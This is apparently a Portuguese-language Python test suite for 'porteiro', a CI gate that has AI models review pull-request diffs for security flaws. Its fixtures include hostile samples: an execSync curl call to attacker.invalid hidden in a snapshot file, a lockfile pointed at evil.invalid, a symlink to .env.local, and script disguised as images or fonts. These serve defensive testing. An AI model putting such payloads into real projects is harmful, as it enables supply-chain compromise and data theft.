                codigo, placar, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
                if nome == "NUL":
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("arquivo binário não lido", placar)
                else:
                    self.assertIn("select * from pay", self.viu(pedidos))
                    self.assertEqual((codigo, modelos), (0, ["glm-5"]))
                # Without --text git prints "Binary files ... differ": never 0.
                for modo in ("avisa", "barra"):
                    codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, sem_text=True, modo=modo)
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("NÃO ANALISADO", placar)
                    self.assertIn("arquivo binário não lido", placar)
        codigo, placar, _, _ = self.roda({"glm-5": VAZIO_JSON}, diff=f"diff --git a/{ROTA} b/{ROTA}\nGIT binary patch\nliteral 3\n")
        self.assertEqual(codigo, 3)
        # A binary image is not code: skipped, the code next to it is analysed.
        codigo, placar, modelos, pedidos = self.pr({"public/logo.png": b"\x89PNG\x00\x01", ROTA: VULN},
                                                   {"glm-5": VAZIO_JSON}, sem_text=True)
        self.assertEqual((codigo, modelos), (0, ["glm-5"]))
        self.assertNotIn("logo.png", self.viu(pedidos))
        self.assertIn("1 arquivo(s) de imagem/fonte fora da análise", placar)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P2_sem_pathspec_lockfile_e_nada_lido_nunca_verde(self):
        # A route inside a folder named like an image is still code.
        for seg in ("x.png", "logo.svg", "a.snap", "f.woff2"):
            with self.subTest(seg):
                _, _, modelos, pedidos = self.pr({f"src/app/api/{seg}/route.ts": VULN}, {"glm-5": VAZIO_JSON})
                self.assertEqual(modelos, ["glm-5"])
                self.assertIn(f"src/app/api/{seg}/route.ts", self.viu(pedidos))
        # SVG carries script: it is analysed.
        _, _, _, pedidos = self.pr({"public/a.svg": b"<svg onload=alert(1)></svg>\n"}, {"glm-5": VAZIO_JSON})
        self.assertIn("onload=alert", self.viu(pedidos))
        # Lockfile-only PR pointing a package at another host: the model reads it.
        lock = '{"packages":{"node_modules/x":{"resolved":"%s","integrity":"sha512-%s"}}}\n'
        base = dict(BASE, **{"package-lock.json": (lock % ("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "A")).encode()})
        _, _, modelos, pedidos = self.pr({"package-lock.json": (lock % ("https://evil.invalid/x.tgz", "B")).encode()},
                                         {"glm-5": VAZIO_JSON}, base=base)
        self.assertEqual(modelos, ["glm-5"])
        self.assertIn("evil.invalid", self.viu(pedidos))
        for lockfile in ("package-lock.json", "apps/web/package-lock.json", "yarn.lock", "pnpm-lock.yaml"):
            self.assertTrue(porteiro.eh_de_risco(lockfile), lockfile)  # kept when the diff is big
        # Round 5: a real binary image only: no AI call, 0 with a note (Q9 has more).
        for modo in ("avisa", "barra"):
            codigo, placar, modelos, _ = self.pr({"public/logo.png": b"\x89PNG\x00\x01"}, {"glm-5": VAZIO_JSON}, modo=modo)
            self.assertEqual((codigo, modelos), (0, []))
            self.assertIn("só com arquivos de imagem/fonte (1)", placar)
        # A lone "\r" in the content cannot forge a header that hides the rest.
        _, _, _, pedidos = self.pr({ROTA: b"// \rdiff --git a/x.png b/x.png\n" + VULN}, {"glm-5": VAZIO_JSON})
        self.assertIn("select * from pay", self.viu(pedidos))

    def test_P2b_arquivo_listado_pelo_git_fora_do_diff_da_3(self):
        with tempfile.TemporaryDirectory() as d:
            dp, np_ = Path(d, "pr.diff"), Path(d, "pr.names")
            dp.write_text(f"diff --git a/{ROTA} b/{ROTA}\n+x\n", encoding="utf-8")
            np_.write_bytes(f"{ROTA}\0src/sumiu.ts\0".encode())
            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(str(dp), str(np_)))
            self.assertEqual((codigo, modelos), (3, ["glm-5"]))
            self.assertIn("PARCIAL — 1 arquivo(s) não lidos (fora do diff)", placar)
            dp.write_text("", encoding="utf-8")  # empty diff, files changed
            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(str(dp), str(np_)))
            self.assertEqual((codigo, modelos), (3, []))
            self.assertNotIn("✅", placar)

    def test_P3_severidade_e_confianca_em_qualquer_grafia_barram(self):
        f = {"titulo": "SQLi", "arquivo": "a", "linha": 1, "severidade": "critica", "confianca": 0.95}
        casos = {
            "confianca ausente": {k: v for k, v in f.items() if k != "confianca"},
            "confianca 95%": dict(f, confianca="95%"),
            "confianca alta": dict(f, confianca="alta"),
            "confianca null": dict(f, confianca=None),
            "confianca 10**400": dict(f, confianca=10 ** 400),
            "crítica": dict(f, severidade="crítica"),
            "CRITICAL": dict(f, severidade="CRITICAL"),
            "high": dict(f, severidade="high"),
            "Alta ": dict(f, severidade="Alta "),
            "desconhecida": dict(f, severidade="severe"),
        }
        for nome, a in casos.items():
            with self.subTest(nome):
                codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [a]})})
                self.assertEqual(codigo, 1)
                self.assertIn("1 bloqueante", placar)
        codigo, _, _, _ = self.roda({"glm-5": '{"achados":[{"titulo":"t","arquivo":"a","severidade":"alta","confianca":NaN}]}'})
        self.assertEqual(codigo, 1)
        # Round 5: English keys are read, so this one blocks at once...
        ingles = json.dumps({"achados": [{"severity": "critical", "file": "a", "title": "SQLi"},
                                         {"titulo": "leve", "arquivo": "a", "severidade": "baixa"}]})
        codigo, placar, modelos, _ = self.roda({"glm-5": ingles, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        # ...and keys in no known spelling next to a light one are out of format,
        # not "one warning": every AI tries, then 3.
        estranho = json.dumps({"achados": [{"level": "critical", "path": "a", "name": "SQLi"},
                                           {"titulo": "leve", "arquivo": "a", "severidade": "baixa"}]})
        codigo, placar, modelos, _ = self.roda({m: estranho for m in ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")})
        self.assertEqual(codigo, 3)
        self.assertIn("NÃO ANALISADO", placar)
        self.assertIsNotNone(porteiro.normaliza({"achados": [{"severity": "x"}, ALTA]}))  # blocking wins
        # Cut reply whose raw text says "crítica" / "critical": indício, never the next AI.
        for sev in ("crítica", "critical", "HIGH"):
            with self.subTest(sev):
                corte = '{"achados":[{"severidade": "%s","arquivo":"a","titulo":"SQL inj' % sev
                codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, "length"), Z1302], "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (3, ["glm-5"]))
                self.assertIn("indício de achado grave", placar)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P4_achado_grave_nunca_some(self):
        diff = f"diff --git a/{ROTA} b/{ROTA}\n+x\n"
        for arq in (f"{ROTA}:42", f"{ROTA}:42:7", ROTA.upper(), f"/home/runner/work/r/r/{ROTA}", f".\\{ROTA}"):
            with self.subTest(arq):
                codigo, _, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, arquivo=arq)]})}, diff=diff)
                self.assertEqual(codigo, 1)
                self.assertEqual(self.detalhe[-1].args[0][0]["arquivo"], arq)  # matched, not relabelled
        # No touched file matches: it still blocks, labelled in the private detail.
        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, arquivo="src/nada.ts")]})}, diff=diff)
        self.assertEqual(codigo, 1)
        self.assertIn("1 bloqueante", placar)
        self.assertIn("(arquivo não identificado) src/nada.ts", self.privado)
        self.assertNotIn("nada.ts", placar)
        # Pre-rename name. Local run (git's rename detection): "rename from".
        velho, novo = "src/app/api/velho/route.ts", "src/app/api/novo/route.ts"
        corpo = b"".join(b"// linha %d\n" % i for i in range(30))
        achado = json.dumps({"achados": [dict(ALTA, arquivo=velho)]})
        codigo, _, _, pedidos = self.pr({velho: None, novo: corpo + VULN}, {"glm-5": achado}, base={velho: corpo},
                                        sem_renames=True)
        self.assertIn(f"rename from {velho}", self.viu(pedidos))
        self.assertEqual((codigo, self.detalhe[-1].args[0][0]["arquivo"]), (1, velho))
        # Round 5, the workflow (--no-renames): the model reads the deleted code.
        codigo, _, _, pedidos = self.pr({velho: None, novo: corpo + VULN}, {"glm-5": achado}, base={velho: corpo})
        self.assertIn("-// linha 0", self.viu(pedidos))
        self.assertEqual((codigo, self.detalhe[-1].args[0][0]["arquivo"]), (1, velho))

    def test_P5_achados_duplicado_nao_apaga_o_bloqueante(self):
        dup = '{"achados":[' + json.dumps(ALTA) + '],"achados":[]}'
        self.assertEqual(len(porteiro.extrai_json(dup)["achados"]), 1)
        codigo, placar, _, _ = self.roda({"glm-5": dup})
        self.assertEqual(codigo, 1)
        self.assertIn("1 bloqueante", placar)
        self.assertEqual(len(porteiro.extrai_json('{"achados":[],"achados":' + json.dumps([ALTA]) + "}")["achados"]), 1)

    def test_P6_log_publico_sem_frase_de_saldo_ou_chave(self):
        # Missing GLM/OpenAI keys, no Kimi quota, and the private alert failed.
        self.roda({"kimi-k3": KIMI_QUOTA, "kimi-k2.6": KIMI_QUOTA},
                  env={"KIMI_API_KEY": CHAVE}, canal="não entregue (HTTP 500)")
        self.assertIn("z.ai glm-5: sem código", self.log)
        self.assertIn("Kimi kimi-k3: código exceeded_current_quota_error", self.log)
        for frase in ("chave", "saldo", "recarregar"):
            self.assertNotIn(frase, self.log)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P7_submodulo_nao_analisado(self):
        for antes, depois in ((None, "a" * 40), ("a" * 40, "b" * 40)):  # added, pointer moved
            diff = diff_submodulo(antes, depois)
            self.assertIn("Subproject commit", diff)
            for modo in ("avisa", "barra"):
                with self.subTest(antes=antes, modo=modo):
                    codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, diff=diff, modo=modo)
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("NÃO ANALISADO", placar)
                    self.assertIn("submódulo", placar)

    def test_P8_testes_do_porteiro_rodam_no_check_obrigatorio(self):
        # "Lint, typecheck, test, build" (job `checks`) is a required check.
        yml = CI.read_text(encoding="utf-8")
        checks = yml.split("\n  checks:\n", 1)[1].split("\n  rls:\n", 1)[0]
        self.assertIn("python3 -m unittest scripts/test_porteiro.py", checks)
        self.assertIn("python3 scripts/porteiro.py --demo", checks)

    # ---- Round 5: asset skip only for real binary images/fonts (each failed on f625ccd) ----
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q1_rename_de_codigo_para_nome_de_asset_e_lido(self):
        base = dict(BASE, **{"src/proxy.ts": PROXY})
        for ext in ("png", "snap", "woff2", "ico"):
            head = {"README.md": b"x\ny\n", "src/proxy.ts": None, f"src/proxy.{ext}": PROXY}
            for local in (False, True):  # the workflow (--no-renames) / a local run with renames
                with self.subTest(ext=ext, local=local):
                    _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON}, base=base, sem_renames=local)
                    self.assertEqual(modelos, ["glm-5"])
                    self.assertIn("src/proxy.ts", self.viu(pedidos))
                    if not local:  # the deleted auth code itself
                        self.assertIn("-export function proxy", self.viu(pedidos))
        # Binary code renamed (with a change) to an image name, local run: the
        # "rename from" name keeps it off the asset path. Without --text git
        # says "Binary files": 3. With --text the hunk (no NUL in it) is read.
        blob = b"// \x00\n" + b"".join(b"export const k%d = %d\n" % (i, i) for i in range(200))
        for sem_text in (True, False):
            with self.subTest(binario=True, sem_text=sem_text):
                codigo, placar, modelos, pedidos = self.pr(
                    {"README.md": b"x\ny\n", "src/a.ts": None, "src/a.png": blob + b"// x\n"}, {"glm-5": VAZIO_JSON},
                    base=dict(BASE, **{"src/a.ts": blob}), sem_text=sem_text, sem_renames=True)
                if sem_text:
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("arquivo binário não lido", placar)
                else:
                    self.assertIn("rename from src/a.ts", self.viu(pedidos))
                    self.assertIn("+// x", self.viu(pedidos))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q2_link_simbolico_e_submodulo_com_nome_de_asset_dao_3(self):
        for nome, entrada, rotulo in (("public/og.png", ("link", "../.env.local"), "link simbólico"),
                                      ("src/app/api/x/route.ts", ("link", "../../../../public/p.png"), "link simbólico"),
                                      ("vendor/lib.png", ("sub", "a" * 40), "submódulo")):
            for modo in ("avisa", "barra"):
                with self.subTest(nome=nome, modo=modo):
                    codigo, placar, modelos, _ = self.pr({"README.md": b"x\ny\n", nome: entrada},
                                                         {"glm-5": VAZIO_JSON}, modo=modo)
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("NÃO ANALISADO", placar)
                    self.assertIn(rotulo, placar)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q3_imagem_ou_fonte_so_de_texto_vai_ao_modelo(self):
        for nome in ("public/p.png", "public/f.woff2", "favicon.ico"):
            for sem_text in (False, True):
                with self.subTest(nome=nome, sem_text=sem_text):
                    _, _, modelos, pedidos = self.pr({nome: VULN}, {"glm-5": VAZIO_JSON}, sem_text=sem_text)
                    self.assertEqual(modelos, ["glm-5"])
                    self.assertIn("select * from pay", self.viu(pedidos))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q4_snapshot_e_codigo(self):
        # vitest runs snapshot files through new Function: they are code.
        self.assertNotIn(".snap", porteiro.ASSETS)
        head = {"src/x.test.ts": b"import {expect,test} from 'vitest'\ntest('x',()=>expect(1).toMatchSnapshot())\n",
                "src/__snapshots__/x.test.ts.snap":
                    b"require('child_process').execSync('curl https://attacker.invalid')\nexports[`x 1`] = `1`;\n"}
        _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
        self.assertEqual(modelos, ["glm-5"])
        self.assertIn("execSync", self.viu(pedidos))
        # A NUL inside a comment is still valid JS: a binary snapshot is 3, never skipped.
        codigo, placar, modelos, _ = self.pr({"README.md": b"x\ny\n", "src/__snapshots__/y.test.ts.snap":
                                              b"/*\x00*/ require('child_process').execSync('id')\n"}, {"glm-5": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (3, []))
        self.assertIn("arquivo binário não lido", placar)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q5_binario_que_nao_e_imagem_nem_fonte_da_3(self):
        # With --text these arrive as mojibake: the model would answer [].
        pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n"  # no NUL: only bytes that are not UTF-8
        # Round 6: fonts/images whose signature is printable (JS polyglot) are code too.
        for nome, blob in (("src/lib/x.wasm", b"\x00asm\x01\x00\x00\x00\x01\x07\x01`\x02\x7f\x7f\x01\x7f"),
                           ("build/addon.node", b"MZ\x90\x00\x03\x00\x00\x00"), ("docs/a.pdf", pdf),
                           ("lib/a.jar", b"PK\x03\x04\x14\x00\x08\x00"), ("public/f.otf", b"OTTO\x00\x0b\x00\x80"),
                           ("public/f.woff", b"wOFF\x00\x01\x00\x00")):
            for modo in ("avisa", "barra"):
                with self.subTest(nome=nome, modo=modo):
                    codigo, placar, modelos, _ = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON}, modo=modo)
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("arquivo binário não lido", placar)
        # Real image/font bytes take the asset path: skipped, the code next to them is read.
        for nome, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0c\x00\x80"), ("public/p.jpg", JPG),
                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif"), ("favicon.ico", b"\x00\x00\x01\x00\x01\x00"),
                           ("public/logo.png", PNG)):
            with self.subTest(nome=nome):
                codigo, _, modelos, pedidos = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
                self.assertNotIn(nome, self.viu(pedidos))
                self.assertIn("select * from pay", self.viu(pedidos))

    def test_Q6_severidade_em_outras_grafias(self):
        casos = {"baixo": "baixa", "médio": "media", "medio": "media", "alto": "alta", "crítico": "critica",
                 "critico": "critica", "Moderate": "media", "moderado": "media", "moderada": "media",
                 "info": "baixa", "Informational": "baixa", "informativo": "baixa", "informativa": "baixa",
                 "none": "baixa", "nenhuma": "baixa", "nenhum": "baixa", "grave": "alta"}
        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="moderado")]})})
        self.assertEqual(codigo, 0)  # a warning, even in "barra"
        self.assertIn("1 achado · 0 bloqueantes", placar)
        codigo, _, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="crítico")]})})
        self.assertEqual(codigo, 1)

    def test_Q7_chaves_em_ingles_e_titulo_sem_severidade(self):
        so_glm = {"GLM_API_KEY": CHAVE}
        casos = {
            "inglês": {"title": "SQLi", "severity": "critical", "file": "a", "line": 7, "confidence": 0.9},
            "misto": {"titulo": "SQLi", "arquivo": "a", "severity": "critical"},
            "nivel": {"titulo": "SQLi", "arquivo": "a", "nivel": "critica"},
            "gravidade": {"titulo": "SQLi", "arquivo": "a", "gravidade": "alta"},
            "severidade null": dict(ALTA, severidade=None),
            "severidade vazia": dict(ALTA, severidade=" "),
            "sem severidade": {"titulo": "SQLi", "arquivo": "a"},
            "baixa e critical": dict(ALTA, severidade="baixa", severity="critical"),
        }
        for nome, a in casos.items():
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.roda({"glm-5": json.dumps({"achados": [a]})}, env=so_glm)
                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
                self.assertIn("1 bloqueante", placar)
        self.roda({"glm-5": json.dumps({"achados": [casos["inglês"]]})}, env=so_glm)
        a = self.detalhe[-1].args[0][0]
        self.assertEqual((a["titulo"], a["arquivo"], a["linha"], a["confianca"]), ("SQLi", "a", 7, 0.9))
        # "confidence" is read too: a low-confidence alta is a warning.
        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [
            {"title": "t", "severity": "high", "file": "a", "confidence": 0.3}]})}, env=so_glm)
        self.assertEqual(codigo, 0)
        self.assertIn("1 achado · 0 bloqueantes", placar)
        # Cut replies: English "severity", or cut right inside the severity value.
        for corte in ('{"achados":[{"severity":"critical","file":"a","title":"SQL inj',
                      '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"'):
            with self.subTest(corte=corte):
                codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, "length"), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (3, ["glm-5"]))
                self.assertIn("indício de achado grave", placar)

    def test_Q8_so_os_caminhos_de_risco_ainda_grandes_da_parcial_sem_ia(self):
        leve = "diff --git a/README.md b/README.md\n+x\n"
        risco = "diff --git a/src/app/api/p.ts b/src/app/api/p.ts\n" + "+y\n" * 1000
        for modo in ("avisa", "barra"):
            with self.subTest(modo=modo):
                codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, env=dict(TODAS, PORTEIRO_MAX_DIFF_KB="1"),
                                                       modo=modo, diff=leve + risco)
                self.assertEqual((codigo, modelos), (3, []))
                self.assertIn("PARCIAL — 2 arquivo(s) não lidos (diff grande)", placar)
                self.assertIn("mesmo só com os caminhos de risco", placar)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q9_pr_so_de_imagem_ou_fonte_de_verdade_passa(self):
        for head in ({"public/logo.png": PNG}, {"public/f.ttf": b"\x00\x01\x00\x00\x00\x0c", "public/p.jpg": JPG}):
            for sem_text in (False, True):
                for modo in ("avisa", "barra"):
                    with self.subTest(head=list(head), sem_text=sem_text, modo=modo):
                        codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, sem_text=sem_text, modo=modo)
                        self.assertEqual((codigo, modelos), (0, []))
                        self.assertIn(f"só com arquivos de imagem/fonte ({len(head)})", placar)
        # Round 6: WOFF2/WebP signatures are printable (JS polyglot): not skipped, binary -> 3.
        for sem_text in (False, True):
            codigo, placar, modelos, _ = self.pr({"public/f.woff2": b"wOF2\x00\x01\x00\x00",
                                                  "public/a.webp": b"RIFF\x1a\x00\x00\x00WEBPVP8 "},
                                                 {"glm-5": VAZIO_JSON}, sem_text=sem_text)
            self.assertEqual((codigo, modelos), (3, []))
            self.assertIn("arquivo binário não lido (2", placar)
        # ...but never when git lists a file the diff does not carry.
        with tempfile.TemporaryDirectory() as d:
            dp, np_ = pr_real(d, BASE, {"public/logo.png": PNG})
            Path(np_).write_bytes(Path(np_).read_bytes() + b"src/sumiu.ts\0")
            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(dp, np_))
        self.assertEqual((codigo, modelos), (3, []))
        self.assertIn("PARCIAL", placar)

    # ---- Round 6: adversarial review of de5b824 (each failed there) ----
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_R1_diff_do_proprio_porteiro_nao_e_binario(self):
        # This PR's own diff: porteiro.py once held a literal U+FFFD and the gate
        # called ITSELF "arquivo binário não lido". Only added lines count now.
        arq, fffd = "scripts/porteiro.py", chr(0xFFFD)
        fonte = Path(porteiro.__file__).read_bytes()
        literal = fonte.decode("utf-8").replace("\\" + "ufffd", fffd)  # the source as it was on de5b824
        self.assertIn(fffd, literal)
        linhas = literal.split("\n")
        i = next(n for n, l in enumerate(linhas) if fffd in l)
        linhas[i - 2] += "  # typo"  # one-line edit next to a U+FFFD context line
        for nome, base, head in (("new porteiro.py", BASE, {arq: fonte}),
                                 ("U+FFFD only on '-' lines", {arq: literal.encode()}, {arq: fonte}),
                                 ("U+FFFD only on context lines", {arq: literal.encode()}, {arq: "\n".join(linhas).encode()})):
            with self.subTest(nome):
                with tempfile.TemporaryDirectory() as d:
                    diff = Path(pr_real(d, base, head)[0]).read_bytes().decode("utf-8", "replace")
                self.assertEqual([a for a, p in porteiro.blocos(diff) if porteiro.binario(p)], [])
                codigo, _, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
                self.assertEqual((codigo, modelos), (0, ["glm-5"]))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_R2_asset_decidido_pelo_lado_novo(self):
        og, base = "public/og.png", dict(BASE, **{"public/og.png": png_real(32, 32, 1)})
        # A real PNG modified, or deleted: skipped, no AI call.
        for nome, head in (("modified", {og: png_real(32, 32, 2)}), ("deleted", {og: None})):
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
                self.assertEqual((codigo, modelos), (0, []))
                self.assertIn("só com arquivos de imagem/fonte (1)", placar)
        # Old image overwritten with JS text (NUL only on '-' lines): the model reads it.
        # Same when the signature line stays and only text is added after it.
        assinado = dict(BASE, **{og: b"\x89PNG\r\n\x00\x01\nx\n"})
        for nome, b, head in (("overwrite", base, {og: PAYLOAD}),
                              ("overwrite + loader", base, {og: PAYLOAD, "next.config.ts": b"require('./public/og.png')\n"}),
                              ("signature kept, text added", assinado, {og: b"\x89PNG\r\n" + PAYLOAD + b"x\n"})):
            with self.subTest(nome):
                _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
                self.assertEqual(modelos, ["glm-5"])
                self.assertIn("execSync", self.viu(pedidos))
        # Binary that JS still parses (printable start, NUL in a comment): never skipped, 3.
        loader = {"next.config.ts": b"require('./public/x.png')\n"}
        for nome, blob in (("public/x.png", b"/*\x00*/" + PAYLOAD), ("public/a.webp", b"RIFF=1/*\x00WEBP*/;" + PAYLOAD),
                           ("public/f.woff", b"wOFF=1/*\x00*/;" + PAYLOAD), ("public/f.woff2", b"wOF2=1/*\x00*/;" + PAYLOAD),
                           ("public/a.gif", b"GIF89a=1/*\x00*/;" + PAYLOAD), ("public/f.otf", b"OTTO=1/*\x00*/;" + PAYLOAD)):
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.pr(dict(loader, **{nome: blob}), {"glm-5": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (3, []))
                self.assertIn("arquivo binário não lido", placar)
        # Line 1 not in the first hunk: nothing proves the start, so not skipped (3).
        # a) a real image whose first lines did not change; b) a text .png in main
        # whose later lines turn binary right after NUL context lines.
        texto = b"a\n" * 8
        casos = (("line 1 unchanged", dict(BASE, **{og: png_real(32, 32, 1, texto)}), {og: png_real(32, 32, 2, texto)}),
                 ("NUL context", dict(BASE, **{og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"z\n"}),
                  {og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"\x00\x01\n"}))
        for nome, b, head in casos:
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
                self.assertEqual((codigo, modelos), (3, []))
                self.assertIn("arquivo binário não lido", placar)

    def test_R3_achado_comecado_e_cortado_da_3(self):
        cortes = {
            "C1 title first": '{"achados":[{"titulo":"SQL injection em /api/pay","arquivo":"a","linha":1,"porque":"concatena o id',
            "C2 English": '{"achados":[{"title":"SQL injection","file":"a","description":"id is concatenated',
            "C3 inside the key name": '{"achados":[{"severid',
            "C4 before the value quote": '{"achados":[{"severidade":',
            "E2 after the value quote": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"',
            "findings": '{"findings":[{"title":"SQLi","file":"a',
            "second list": '{"achados":[],"achados":[{"titulo":"SQLi',
        }
        for nome, corte in cortes.items():
            for fim in ("length", "stop"):
                with self.subTest(nome, fim=fim):
                    codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))  # no retry, no reserve
                    self.assertIn("indício de achado grave", placar)
        # Cut after a closed empty list is not a finding: the retry may answer.
        codigo, _, modelos, _ = self.roda({"glm-5": [('{"achados":[]', "length"), VAZIO_JSON]})
        self.assertEqual((codigo, modelos), (0, ["glm-5", "glm-5"]))

    def test_R4_chaves_repetidas_e_achado_fora_da_lista(self):
        grave = {"titulo": "SQLi", "arquivo": "a", "severidade": "critica"}
        barram = {
            "D6b severidade critica then baixa": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"critica","severidade":"baixa"}]}',
            "severity critical then low": '{"achados":[{"title":"SQLi","file":"a","severity":"critical","severity":"low"}]}',
            "achados [] + findings": json.dumps({"achados": [], "findings": [grave]}),
            "findings only": json.dumps({"findings": [grave]}),
            "confianca 0.3 + confidence 0.95": json.dumps({"achados": [dict(grave, confianca=0.3, confidence=0.95)]}),
            "confianca 0.95 then 0.3": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"alta","confianca":0.95,"confianca":0.3}]}',
        }
        for nome, resposta in barram.items():
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
                self.assertIn("1 bloqueante", placar)
        # English "findings" is the list itself: empty is a clean 0, a light one a warning.
        for resposta, esperado in (('{"findings":[]}', "✅ **0 achados**"),
                                   (json.dumps({"findings": [dict(grave, severidade="baixa")]}), "1 achado · 0 bloqueantes")):
            with self.subTest(resposta):
                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
                self.assertIn(esperado, placar)
        # A finding outside the list, or an "achados" that is not a list, is out of format.
        # With a raw critica it is an indício at once (3, no reserve); a nested
        # "achados" list is rescued and its critica blocks (1)...
        todas = ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")
        for nome, resposta, esperado in (
                ("vulnerabilities", json.dumps({"achados": [], "vulnerabilities": [grave]}), 3),
                ("nested", json.dumps({"achados": [], "result": {"achados": [grave]}}), 1),
                ("achados object then []", '{"achados":' + json.dumps(grave) + ',"achados":[]}', 3)):
            with self.subTest(nome):
                codigo, placar, modelos, _ = self.roda({m: resposta for m in todas})
                self.assertEqual((codigo, modelos), (esperado, ["glm-5"]))
                self.assertIn("NÃO ANALISADO" if esperado == 3 else "1 bloqueante", placar)
        # ...and with only a title every AI tries, then 3.
        so_titulo = json.dumps({"achados": [], "vulnerabilities": [{"title": "SQLi", "file": "a"}]})
        codigo, placar, modelos, _ = self.roda({m: so_titulo for m in todas})
        self.assertEqual((codigo, modelos.count("glm-5"), modelos[-1]), (3, 3, "gpt-5.5"))
        self.assertIn("nenhuma IA disponível", placar)

    def test_R5_severidade_leve_em_outras_palavras(self):
        casos = {"minor": "baixa", "Trivial": "baixa", "negligible": "baixa", "N/A": "baixa", "nit": "baixa",
                 "note": "baixa", "informativo": "baixa", "Low (informational)": "baixa", "Medium (CVSS 5.3)": "media",
                 "low/critical": "critica", "high / medium": "alta", "baixa/crítica": "critica", "(low)": "alta"}
        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="Minor")]})})
        self.assertEqual(codigo, 0)  # a warning, even in "barra"
        self.assertIn("1 achado · 0 bloqueantes", placar)


if __name__ == "__main__":
    unittest.main()
